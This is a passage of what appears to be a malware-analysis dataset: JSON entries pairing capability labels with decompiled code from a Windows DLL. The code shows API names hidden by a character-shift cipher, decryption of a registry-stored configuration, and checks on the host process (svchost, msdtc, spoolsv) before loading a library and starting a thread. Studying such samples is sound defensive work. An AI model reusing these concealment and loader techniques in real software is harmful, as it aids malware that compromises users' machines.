        "decompiled_code": "\nuint fcn.180016260(int64_t arg1, int64_t arg2, uint64_t *arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    ulong in_stack_00000028;\n    uint64_t uStack40;\n    uint uStack20;\n    \n    uStack20 = 0;\n    uStack40 = arg2 - 1;\n    iVar1 = fcn.1800250fc(arg1, uStack40, arg4, in_stack_00000028);\n    if ((iVar1 < 0) || (uStack40 < iVar1)) {\n        *(arg1 + uStack40 * 2) = 0;\n        uStack20 = 0x8007007a;\n    }\n    else if (iVar1 == uStack40) {\n        *(arg1 + uStack40 * 2) = 0;\n    }\n    else {\n        uStack40 = iVar1;\n    }\n    if (arg3 != NULL) {\n        *arg3 = uStack40;\n    }\n    return uStack20;\n}\n",
        "token_count": 230
    },
    "18001645": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180016450(void)\n\n{\n    code *pcVar1;\n    ulong arg2;\n    uchar auStack232 [32];\n    uint uStack200;\n    uint uStack192;\n    ulong uStack184;\n    ulong *puStack176;\n    ulong uStack168;\n    int32_t iStack152;\n    ushort uStack136;\n    ushort uStack134;\n    ushort uStack132;\n    ushort uStack130;\n    ushort uStack128;\n    ushort uStack126;\n    ushort uStack124;\n    ushort uStack122;\n    ushort uStack120;\n    ushort uStack118;\n    ushort uStack116;\n    ushort uStack114;\n    ushort uStack112;\n    ushort uStack110;\n    ushort uStack108;\n    ushort uStack106;\n    ushort uStack104;\n    ushort uStack102;\n    ushort uStack100;\n    ulong uStack96;\n    uchar auStack88 [40];\n    uchar uStack48;\n    uchar uStack47;\n    ulong uStack40;\n    ulong uStack32;\n    uint64_t uStack24;\n    \n    uStack40 = 0xfffffffffffffffe;\n    uStack24 = *0x180040248 ^ auStack232;\n    iStack152 = 0;\n    uStack96 = 0;\n    uStack136 = 0x2e;\n    uStack134 = 0x73;\n    uStack132 = 0x62;\n    uStack130 = 0x72;\n    uStack128 = 0x5c;\n    uStack126 = 0x53;\n    uStack124 = 0x74;\n    uStack122 = 0x61;\n    uStack120 = 0x72;\n    uStack118 = 0x74;\n    uStack116 = 0x4f;\n    uStack114 = 0x76;\n    uStack112 = 0x65;\n    uStack110 = 0x72;\n    uStack108 = 0x72;\n    uStack106 = 0x69;\n    uStack104 = 100;\n    uStack102 = 0x65;\n    uStack100 = 0;\n    fcn.180001e80(auStack88, &uStack136);\n    uStack32 = fcn.1800020d0(auStack88);\n    pcVar1 = fcn.18001e5f0(\"SfhDsfbufLfzFyX\");\n    uStack168 = 0;\n    puStack176 = &uStack96;\n    uStack184 = 0;\n    uStack192 = 0xf003f;\n    uStack200 = 0;\n    arg2 = uStack32;\n    iStack152 = (*pcVar1)(0xffffffff80000000, uStack32, 0, 0);\n    if (iStack152 == 0) {\n        pcVar1 = fcn.18001e5f0(0x180038e88);\n        (*pcVar1)(uStack96);\n        uStack47 = 1;\n        fcn.180001ef0(auStack88, arg2);\n    }\n    else {\n        uStack48 = 0;\n        fcn.180001ef0(auStack88, arg2);\n    }\n    fcn.180023980(uStack24 ^ auStack232);\n    return;\n}\n",
        "token_count": 721
    },
    "18001664": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180016640(void)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    ulong *puVar4;\n    uchar *puVar5;\n    uchar auStack488 [32];\n    ulong *puStack456;\n    int32_t *piStack448;\n    uint uStack440;\n    int32_t iStack436;\n    ushort uStack424;\n    ushort uStack422;\n    ushort uStack420;\n    ushort uStack418;\n    ushort uStack416;\n    ushort uStack414;\n    ushort uStack412;\n    ushort uStack410;\n    ushort uStack408;\n    ushort uStack406;\n    ushort uStack404;\n    ushort uStack402;\n    ushort uStack400;\n    ushort uStack398;\n    ushort uStack396;\n    ushort uStack394;\n    ushort uStack392;\n    ushort uStack390;\n    ushort uStack388;\n    ulong uStack384;\n    uchar auStack376 [40];\n    int32_t aiStack336 [2];\n    ulong auStack328 [34];\n    uchar uStack56;\n    uchar uStack55;\n    uchar uStack54;\n    uchar uStack53;\n    ulong uStack48;\n    ulong uStack40;\n    uint64_t uStack32;\n    \n    uStack48 = 0xfffffffffffffffe;\n    uStack32 = *0x180040248 ^ auStack488;\n    iStack436 = 0;\n    uStack384 = 0;\n    uStack424 = 0x2e;\n    uStack422 = 0x73;\n    uStack420 = 0x62;\n    uStack418 = 0x72;\n    uStack416 = 0x5c;\n    uStack414 = 0x53;\n    uStack412 = 0x74;\n    uStack410 = 0x61;\n    uStack408 = 0x72;\n    uStack406 = 0x74;\n    uStack404 = 0x4f;\n    uStack402 = 0x76;\n    uStack400 = 0x65;\n    uStack398 = 0x72;\n    uStack396 = 0x72;\n    uStack394 = 0x69;\n    uStack392 = 100;\n    uStack390 = 0x65;\n    uStack388 = 0;\n    fcn.180001e80(auStack376, &uStack424);\n    uStack40 = fcn.1800020d0(auStack376);\n    pcVar1 = fcn.18001e5f0(0x180038e98);\n    puStack456 = &uStack384;\n    uVar3 = uStack40;\n    iStack436 = (*pcVar1)(0xffffffff80000000, uStack40, 0, 0xf003f);\n    if (iStack436 == 0) {\n        uStack440 = 0;\n        puVar4 = auStack328;\n        for (iVar2 = 0x104; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        aiStack336[0] = 0x104;\n        pcVar1 = fcn.18001e5f0(0x180038ea8);\n        piStack448 = aiStack336;\n        puStack456 = auStack328;\n        uVar3 = 0x180038ec8;\n        iStack436 = (*pcVar1)(uStack384, 0x180038ec8, 0, &uStack440);\n        if (iStack436 == 0) {\n            if (aiStack336[0] == 0) {\n                puVar5 = 0x18004a180;\n                for (iVar2 = 0x80; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar5 = 0;\n                    puVar5 = puVar5 + 1;\n                }\n                pcVar1 = fcn.18001e5f0(0x180038ef8);\n                (*pcVar1)(uStack384);\n                uStack53 = 0;\n                fcn.180001ef0(auStack376, uVar3);\n            }\n            else {\n                puVar5 = 0x18004a180;\n                for (iVar2 = 0x80; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar5 = 0;\n                    puVar5 = puVar5 + 1;\n                }\n                puVar4 = auStack328;\n                puVar5 = 0x18004a180;\n                for (iVar2 = 0x80; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar5 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    puVar5 = puVar5 + 1;\n                }\n                pcVar1 = fcn.18001e5f0(0x180038ee8);\n                (*pcVar1)(uStack384);\n                uStack54 = 1;\n                fcn.180001ef0(auStack376, uVar3);\n            }\n        }\n        else {\n            pcVar1 = fcn.18001e5f0(0x180038ed8);\n            (*pcVar1)(uStack384);\n            uStack55 = 0;\n            fcn.180001ef0(auStack376, uVar3);\n        }\n    }\n    else {\n        uStack56 = 0;\n        fcn.180001ef0(auStack376, uVar3);\n    }\n    fcn.180023980(uStack32 ^ auStack488);\n    return;\n}\n",
        "token_count": 1259
    },
    "18001699": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180016990(ulong arg1, ulong arg2)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    code *pcVar4;\n    int64_t iVar5;\n    uchar *puVar6;\n    uint auStackX24 [2];\n    ulong uStackX32;\n    ulong uStack16;\n    \n    uStack16 = 0x1800169a5;\n    iVar2 = fcn.1800303a0();\n    iVar2 = -iVar2;\n    *(&stack0x00004060 + iVar2) = *0x180040248 ^ &stack0xfffffffffffffff8 + iVar2;\n    *(&stack0x00000028 + iVar2) = 0;\n    puVar6 = &stack0x00000038 + iVar2;\n    for (iVar5 = 0xd; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *(&stack0xfffffffffffffff0 + iVar2) = 0x1800169f0;\n    fcn.180023f9c(&stack0x00000038 + iVar2, 0xd, *(&stack0x00004080 + iVar2), 0xd);\n    if (*(*(&stack0x00004080 + iVar2) + 0xc) == '\\x04') {\n        *(&stack0xfffffffffffffff0 + iVar2) = 0x180016a0b;\n        uVar3 = fcn.180015b40(0xd);\n        *(&stack0x00000048 + iVar2) = uVar3;\n        *(&stack0xfffffffffffffff0 + iVar2) = 0x180016a2a;\n        fcn.180023f9c(*(&stack0x00000048 + iVar2), 0xd, &stack0x00000038 + iVar2, 0xd);\n        **(&stack0x00000048 + iVar2) = *0x18004a168;\n        *(&stack0xfffffffffffffff0 + iVar2) = 0x180016a43;\n        pcVar4 = fcn.18001e5f0(0x180038f58);\n        *(&stack0x00000020 + iVar2) = 0;\n        *(&stack0x00000018 + iVar2) = 0;\n        *(&stack0xfffffffffffffff0 + iVar2) = 0x180016a66;\n        (*pcVar4)(0, 0, 0x18001e740, *(&stack0x00000048 + iVar2));\n    }\n    else {\n        puVar6 = &stack0x00000058 + iVar2;\n        for (iVar5 = 0x4000; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        if (*(&stack0x00000038 + iVar2) != 0) {\n            *(&stack0xfffffffffffffff0 + iVar2) = 0x180016a92;\n            fcn.1800011f0(&stack0x00000058 + iVar2, 0x4000);\n            *(&stack0xfffffffffffffff0 + iVar2) = 0x180016ab0;\n            cVar1 = (**0x18004ac60)(*(&stack0x00004078 + iVar2), &stack0x00000058 + iVar2, *(&stack0x00000038 + iVar2), \n                                    0xc);\n            if (cVar1 == '\\0') goto code_r0x000180016b22;\n            *(&stack0xfffffffffffffff0 + iVar2) = 0x180016add;\n            fcn.18001f590(*0x18004a178, *(&stack0x00004078 + iVar2), &stack0x00000058 + iVar2);\n        }\n        (&stack0x00004058)[iVar2] = (&stack0x00000044)[iVar2];\n        if ((&stack0x00004058)[iVar2] == '\\x0e') {\n            *(&stack0xfffffffffffffff0 + iVar2) = 0x180016b06;\n            fcn.180016930();\n        }\n        else if ((&stack0x00004058)[iVar2] == '\\x0f') {\n            *(&stack0xfffffffffffffff0 + iVar2) = 0x180016b12;\n            fcn.180016930();\n            *0x180049d9c = 0;\n        }\n    }\ncode_r0x000180016b22:\n    *(&stack0xfffffffffffffff0 + iVar2) = 0x180016b32;\n    fcn.180023980(*(&stack0x00004060 + iVar2) ^ &stack0xfffffffffffffff8 + iVar2);\n    return;\n}\n",
        "token_count": 1089
    },
    "180016fa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180016fa0(int64_t arg1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    uint64_t uVar5;\n    char16_t *arg2;\n    uint64_t arg2_00;\n    char *pcVar6;\n    uchar *puVar7;\n    int16_t *piVar8;\n    uchar auStack792 [40];\n    uchar auStack752 [40];\n    uint32_t uStack712;\n    uint32_t uStack708;\n    uchar auStack704 [40];\n    int16_t *apiStack664 [2];\n    uchar auStack648 [528];\n    char cStack120;\n    uchar auStack112 [40];\n    uchar *puStack72;\n    uchar uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    uint32_t uStack40;\n    ulong uStack32;\n    uint64_t uStack24;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack24 = *0x180040248 ^ auStack792;\n    if (arg1 != 0) {\n        uStack48 = fcn.180001e80(auStack752, *(arg1 + 0x49));\n        arg2 = L\"PUID: \";\n        iVar3 = fcn.18001c310(uStack48, L\"PUID: \", 0);\n        cStack120 = iVar3 != *0x180039ea8;\n        uStack40 = cStack120;\n        fcn.180001ef0(auStack752, arg2);\n        if (cStack120 == '\\0') {\n            iVar3 = -1;\n            pcVar6 = 0x18004a180;\n            do {\n                if (iVar3 == 0) break;\n                iVar3 = iVar3 + -1;\n                cVar2 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar2 != '\\0');\n            if (iVar3 == -2) {\n                cVar2 = fcn.180016640();\n                if (cVar2 == '\\0') goto code_r0x00018001726a;\n                iVar3 = -1;\n                pcVar6 = 0x18004a180;\n                do {\n                    if (iVar3 == 0) break;\n                    iVar3 = iVar3 + -1;\n                    cVar2 = *pcVar6;\n                    pcVar6 = pcVar6 + 1;\n                } while (cVar2 != '\\0');\n                if (iVar3 == -2) goto code_r0x00018001726a;\n            }\n            uStack712 = *(arg1 + 0x45) + 0x800;\n            apiStack664[0] = fcn.180015b40(uStack712);\n            fcn.180023f9c(apiStack664[0], uStack712, *(arg1 + 0x49), *(arg1 + 0x45));\n            puVar7 = auStack648;\n            for (iVar3 = 0x208; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            puStack72 = auStack112;\n            uStack32 = fcn.18000b740(puStack72, 0x18004a180);\n            fcn.18000e140(auStack704, uStack32);\n            uVar4 = fcn.1800020d0(auStack704);\n            fcn.180015f80(auStack648, 0x208, L\"PUID: %s; \", uVar4);\n            fcn.180015ef0(apiStack664[0], uStack712, auStack648);\n            fcn.180015b80(arg1 + 0x49);\n            iVar3 = -1;\n            piVar8 = apiStack664[0];\n            do {\n                if (iVar3 == 0) break;\n                iVar3 = iVar3 + -1;\n                iVar1 = *piVar8;\n                piVar8 = piVar8 + 1;\n            } while (iVar1 != 0);\n            uStack708 = ~iVar3 * 2;\n            uVar4 = fcn.180015b40(uStack708);\n            *(arg1 + 0x49) = uVar4;\n            uVar5 = 0xffffffffffffffff;\n            piVar8 = apiStack664[0];\n            do {\n                if (uVar5 == 0) break;\n                uVar5 = uVar5 - 1;\n                iVar1 = *piVar8;\n                piVar8 = piVar8 + 1;\n            } while (iVar1 != 0);\n            arg2_00 = uStack708;\n            fcn.180023f9c(*(arg1 + 0x49), arg2_00, apiStack664[0], (~uVar5 - 1) * 2);\n            *(arg1 + 0x45) = uStack708;\n            fcn.180015b80(apiStack664);\n            uStack64 = 1;\n            fcn.180001ef0(auStack704, arg2_00);\n        }\n    }\ncode_r0x00018001726a:\n    fcn.180023980(uStack24 ^ auStack792);\n    return;\n}\n",
        "token_count": 1184
    },
    "18001779": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180017790(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    ushort *arg2_00;\n    uchar *puVar3;\n    uchar auStack744 [32];\n    uint uStack712;\n    ulong uStack704;\n    uchar auStack680 [528];\n    ushort uStack152;\n    ushort uStack150;\n    ushort uStack148;\n    ushort uStack146;\n    ushort uStack144;\n    ushort uStack142;\n    ushort uStack140;\n    ushort uStack138;\n    ushort uStack136;\n    ushort uStack134;\n    ushort uStack132;\n    ushort uStack130;\n    ushort uStack128;\n    ushort uStack126;\n    ushort uStack124;\n    ushort uStack122;\n    ushort uStack120;\n    ushort uStack118;\n    ushort uStack116;\n    ushort uStack114;\n    ushort uStack112;\n    ushort uStack110;\n    uchar auStack104 [40];\n    ushort uStack64;\n    ushort uStack62;\n    ushort uStack60;\n    ushort uStack58;\n    ushort uStack56;\n    ushort uStack54;\n    ushort uStack52;\n    ushort uStack50;\n    ushort uStack48;\n    ushort uStack46;\n    ushort uStack44;\n    ushort uStack42;\n    int64_t iStack40;\n    ulong uStack32;\n    int32_t iStack24;\n    uint64_t uStack16;\n    \n    uStack32 = 0xfffffffffffffffe;\n    uStack16 = *0x180040248 ^ auStack744;\n    puVar3 = auStack680;\n    for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iStack24 = arg2;\n    if (arg2 != 1) goto code_r0x000180017aa9;\n    pcVar1 = fcn.18001e5f0(0x180039018);\n    (*pcVar1)(arg1, 0x180049e10, 0x104);\n    pcVar1 = fcn.18001e5f0(\"HfuNpevmfGjmfObnfX\");\n    (*pcVar1)(0, auStack680);\n    uStack152 = 0x73;\n    uStack150 = 0x76;\n    uStack148 = 99;\n    uStack146 = 0x68;\n    uStack144 = 0x6f;\n    uStack142 = 0x73;\n    uStack140 = 0x74;\n    uStack138 = 0x2e;\n    uStack136 = 0x65;\n    uStack134 = 0x78;\n    uStack132 = 0x65;\n    uStack130 = 0;\n    uStack128 = 0x6d;\n    uStack126 = 0x73;\n    uStack124 = 100;\n    uStack122 = 0x74;\n    uStack120 = 99;\n    uStack118 = 0x2e;\n    uStack116 = 0x65;\n    uStack114 = 0x78;\n    uStack112 = 0x65;\n    uStack110 = 0;\n    uStack64 = 0x73;\n    uStack62 = 0x70;\n    uStack60 = 0x6f;\n    uStack58 = 0x6f;\n    uStack56 = 0x6c;\n    uStack54 = 0x73;\n    uStack52 = 0x76;\n    uStack50 = 0x2e;\n    uStack48 = 0x65;\n    uStack46 = 0x78;\n    uStack44 = 0x65;\n    uStack42 = 0;\n    fcn.180001e80(auStack104, auStack680);\n    arg2_00 = &uStack152;\n    iVar2 = fcn.18001c310(auStack104, arg2_00, 0);\n    if (iVar2 == -1) {\n        arg2_00 = &uStack128;\n        iVar2 = fcn.18001c310(auStack104, arg2_00, 0);\n        if (iVar2 != -1) goto code_r0x000180017a4e;\n        arg2_00 = &uStack64;\n        iVar2 = fcn.18001c310(auStack104, arg2_00, 0);\n        if (iVar2 != -1) goto code_r0x000180017a4e;\n    }\n    else {\ncode_r0x000180017a4e:\n        iStack40 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x180049e10);\n        if (iStack40 != 0) {\n            pcVar1 = fcn.18001e5f0(0x180039048);\n            uStack704 = 0;\n            uStack712 = 0;\n            arg2_00 = NULL;\n            (*pcVar1)(0, 0, 0x18001bb30, 0);\n        }\n    }\n    fcn.180001ef0(auStack104, arg2_00);\ncode_r0x000180017aa9:\n    fcn.180023980(uStack16 ^ auStack744);\n    return;\n}\n",
        "token_count": 1198
    },
    "180017d6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180017d60(void)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    uchar *noname_1;\n    uchar auStack360 [40];\n    uchar auStack320 [40];\n    uchar auStack280 [40];\n    int32_t iStack240;\n    int32_t iStack236;\n    uchar auStack232 [40];\n    uchar auStack192 [40];\n    uchar auStack152 [40];\n    uchar *puStack112;\n    uchar auStack104 [40];\n    uchar *puStack64;\n    ulong uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    uint64_t uStack16;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack16 = *0x180040248 ^ auStack360;\n    puStack112 = auStack152;\n    uStack48 = fcn.180001e80(puStack112, 0x18004a2fc);\n    uStack40 = fcn.18000dfc0(auStack320, uStack48);\n    uVar1 = fcn.1800033a0(uStack40);\n    uVar3 = 100;\n    fcn.180024f9c(0x18004a020, 100, uVar1);\n    fcn.180003370(auStack320, uVar3);\n    puStack64 = auStack104;\n    uStack32 = fcn.180001e80(puStack64, 0x18004a234);\n    uStack24 = fcn.18000dfc0(auStack280, uStack32);\n    uVar1 = fcn.1800033a0(uStack24);\n    uVar3 = 100;\n    fcn.180024f9c(0x18004a090, 100, uVar1);\n    fcn.180003370(auStack280, uVar3);\n    *0x180049e04 = *0x18004a3c4;\n    *0x18004a018 = *0x18004a3c8;\n    fcn.180023f9c(0x18004a9b0, 0x2a0, 0x18004a704, 0x2a0);\n    if (*0x18004a3cc != 0) {\n        noname_1 = *0x18004a9a4;\n        fcn.180001e80(auStack232, *0x18004a9a4);\n        iStack240 = 0;\n        iStack236 = 0;\n        while ((-1 < iStack240 && (-1 < iStack236))) {\n            noname_1 = CONCAT62(noname_1 >> 0x10, 0x3b);\n            iStack236 = fcn.180002100(auStack232, noname_1, iStack240);\n            if (iStack236 == -1) break;\n            noname_1 = auStack192;\n            fcn.180002180(auStack232, noname_1, iStack240, iStack236 - iStack240);\n            iVar2 = fcn.1800020f0(auStack192);\n            if (iVar2 != 0) {\n                noname_1 = auStack192;\n                fcn.18000e660(0x18004af40, noname_1);\n            }\n            fcn.180001ef0(auStack192, noname_1);\n            iStack240 = iStack236 + 1;\n        }\n        fcn.180001ef0(auStack232, noname_1);\n    }\n    fcn.180023980(uStack16 ^ auStack360);\n    return;\n}\n",
        "token_count": 832
    },
    "18001887": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180018870(void)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uint16_t *puVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    int32_t *piVar10;\n    char *pcVar11;\n    uchar auStack392 [32];\n    ulong *puStack360;\n    ulong uStack352;\n    ulong *apuStack344 [2];\n    char acStack328 [40];\n    uint uStack288;\n    uint32_t uStack284;\n    uint32_t auStack280 [2];\n    ushort uStack272;\n    ushort uStack270;\n    ushort uStack268;\n    ushort uStack266;\n    ushort uStack264;\n    ushort uStack262;\n    ushort uStack260;\n    ushort uStack258;\n    ushort uStack256;\n    ushort uStack254;\n    ushort uStack252;\n    ushort uStack250;\n    ushort uStack248;\n    ushort uStack246;\n    ushort uStack244;\n    ushort uStack242;\n    ushort uStack240;\n    ushort uStack238;\n    ushort uStack236;\n    ushort uStack232;\n    ushort uStack230;\n    ushort uStack228;\n    ushort uStack226;\n    ushort uStack224;\n    ushort uStack222;\n    ushort uStack220;\n    ulong uStack216;\n    uchar auStack208 [8];\n    uint32_t auStack200 [4];\n    int32_t aiStack184 [2];\n    uchar auStack176 [5];\n    uint32_t uStack171;\n    uint32_t uStack167;\n    char acStack163 [33];\n    char acStack130 [33];\n    int64_t iStack97;\n    int64_t aiStack89 [2];\n    uint16_t auStack72 [4];\n    ushort uStack64;\n    ushort uStack62;\n    ushort uStack60;\n    ushort uStack58;\n    ushort uStack56;\n    ushort uStack54;\n    ushort uStack52;\n    ushort uStack50;\n    ushort uStack48;\n    ushort uStack46;\n    ushort uStack44;\n    ushort uStack42;\n    uchar uStack40;\n    uchar uStack39;\n    ulong uStack32;\n    uint64_t uStack24;\n    \n    uStack32 = 0xfffffffffffffffe;\n    uStack24 = *0x180040248 ^ auStack392;\n    uStack284 = 0;\n    apuStack344[0] = NULL;\n    piVar10 = aiStack184;\n    for (iVar8 = 0x67; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *piVar10 = 0;\n        piVar10 = piVar10 + 1;\n    }\n    uStack216 = 0;\n    uStack272 = 0x2e;\n    uStack270 = 0x73;\n    uStack268 = 0x62;\n    uStack266 = 0x72;\n    uStack264 = 0x5c;\n    uStack262 = 0x53;\n    uStack260 = 0x74;\n    uStack258 = 0x61;\n    uStack256 = 0x72;\n    uStack254 = 0x74;\n    uStack252 = 0x4f;\n    uStack250 = 0x76;\n    uStack248 = 0x65;\n    uStack246 = 0x72;\n    uStack244 = 0x72;\n    uStack242 = 0x69;\n    uStack240 = 100;\n    uStack238 = 0x65;\n    uStack236 = 0;\n    pcVar6 = fcn.18001e5f0(0x1800390b8);\n    puStack360 = &uStack216;\n    uStack284 = (*pcVar6)(0xffffffff80000000, &uStack272, 0, 0xf003f);\n    if (uStack284 == 0) {\n        uStack288 = 0;\n        auStack280[0] = 0;\n        uStack232 = 0x43;\n        uStack230 = 0x4f;\n        uStack228 = 0x4e;\n        uStack226 = 0x46;\n        uStack224 = 0x49;\n        uStack222 = 0x47;\n        uStack220 = 0;\n        pcVar6 = fcn.18001e5f0(0x1800390c8);\n        uStack352 = auStack280;\n        puStack360 = NULL;\n        uStack284 = (*pcVar6)(uStack216, &uStack232, 0, &uStack288);\n        if (uStack284 == 0) {\n            apuStack344[0] = fcn.180015b40(auStack280[0]);\n            auStack200[0] = auStack280[0];\n            pcVar6 = fcn.18001e5f0(0x1800390f0);\n            uStack352 = auStack200;\n            puStack360 = apuStack344[0];\n            uStack284 = (*pcVar6)(uStack216, &uStack232, 0, &uStack288);\n            if ((uStack284 == 0) && (auStack200[0] == auStack280[0])) {\n                pcVar6 = fcn.18001e5f0(0x180039118);\n                (*pcVar6)(uStack216);\n                fcn.180007a60(auStack208);\n                pcVar11 = acStack328;\n                for (iVar8 = 0x21; iVar8 != 0; iVar8 = iVar8 + -1) {\n                    *pcVar11 = '\\0';\n                    pcVar11 = pcVar11 + 1;\n                }\n                fcn.1800011f0(aiStack184, 0x67);\n                fcn.180023f9c(aiStack184, 0x57, apuStack344[0], 0x57);\n                if ((((uStack167 + 0x57 <= auStack280[0]) && (aiStack184[0] == 0xae86)) && (uStack171 != 0)) &&\n                   (uStack167 != 0)) {\n                    iVar8 = -1;\n                    pcVar11 = acStack163;\n                    do {\n                        if (iVar8 == 0) break;\n                        iVar8 = iVar8 + -1;\n                        cVar1 = *pcVar11;\n                        pcVar11 = pcVar11 + 1;\n                    } while (cVar1 != '\\0');\n                    if (iVar8 != -2) {\n                        iVar8 = -1;\n                        pcVar11 = acStack130;\n                        do {\n                            if (iVar8 == 0) break;\n                            iVar8 = iVar8 + -1;\n                            cVar1 = *pcVar11;\n                            pcVar11 = pcVar11 + 1;\n                        } while (cVar1 != '\\0');\n                        if (iVar8 != -2) {\n                            aiStack89[0] = fcn.180015b40(uStack167);\n                            fcn.180023f9c(aiStack89[0], uStack167, apuStack344[0] + 0x57, uStack167);\n                            fcn.1800011f0(acStack328, 0x21);\n                            fcn.180009740(auStack208, aiStack89[0], uStack167, acStack328);\n                            uVar9 = 0xffffffffffffffff;\n                            pcVar11 = acStack328;\n                            do {\n                                if (uVar9 == 0) break;\n                                uVar9 = uVar9 - 1;\n                                cVar1 = *pcVar11;\n                                pcVar11 = pcVar11 + 1;\n                            } while (cVar1 != '\\0');\n                            iVar5 = fcn.180030ca8(acStack130, acStack328, ~uVar9 - 1);\n                            if (iVar5 == 0) {\n                                iStack97 = fcn.180015b40(uStack171);\n                                uStack352 = CONCAT44(uStack352._4_4_, 5);\n                                puStack360 = auStack176;\n                                uVar4 = (**0x18004aca8)(iStack97, &uStack171, aiStack89[0], uStack167);\n                                uStack284 = uVar4;\n                                if (uStack284 != 0) {\n                                    fcn.1800011f0(acStack328, 0x21);\n                                    fcn.180009740(auStack208, iStack97, uStack171, acStack328);\n                                    uVar9 = 0xffffffffffffffff;\n                                    pcVar11 = acStack328;\n                                    do {\n                                        if (uVar9 == 0) break;\n                                        uVar9 = uVar9 - 1;\n                                        cVar1 = *pcVar11;\n                                        pcVar11 = pcVar11 + 1;\n                                    } while (cVar1 != '\\0');\n                                    iVar5 = fcn.180030ca8(acStack163, acStack328, ~uVar9 - 1);\n                                    if (iVar5 == 0) {\n                                        fcn.180023f9c(0x18004a200, 0x34, iStack97, 0x34);\n                                        auStack72[0] = 0x34;\n                                        auStack72[1] = 0x65;\n                                        auStack72[2] = 0x4a;\n                                        auStack72[3] = 0x6f;\n                                        uStack64 = 0x43;\n                                        uStack62 = 0x71;\n                                        uStack60 = 0x43;\n                                        uStack58 = 0x4e;\n                                        uStack56 = 0x77;\n                                        uStack54 = 0x4e;\n                                        uStack52 = 0x5a;\n                                        uStack50 = 0x36;\n                                        uStack48 = 0x34;\n                                        uStack46 = 0x73;\n                                        uStack44 = 0x43;\n                                        uStack42 = 0;\n                                        puVar7 = 0x18004a200;\n                                        do {\n                                            uVar2 = *puVar7;\n                                            if (uVar2 != *(puVar7 + &stack0xfffffffe7ffb5db8)) {\n                                                uVar3 = uVar2 < *(puVar7 + &stack0xfffffffe7ffb5db8);\n                                                iVar5 = (1 - uVar3) - (uVar3 != 0);\n                                                goto code_r0x000180018ed4;\n                                            }\n                                            puVar7 = puVar7 + 1;\n                                        } while (uVar2 != 0);\n                                        iVar5 = 0;\ncode_r0x000180018ed4:\n                                        if (iVar5 == 0) {\n                                            if (*0x18004a224 != 0) {\n                                                fcn.180023f9c(0x18004a234, 0x19c, iStack97 + 0x34, 0x19c);\n                                            }\n                                            if (*0x18004a228 != 0) {\n                                                fcn.180023f9c(0x18004a3d0, 800, iStack97 + 0x34 + *0x18004a224, 800);\n                                            }\n                                            if (*0x18004a22c != 0) {\n                                                fcn.180023f9c(0x18004a6f0, 0x2b4, \n                                         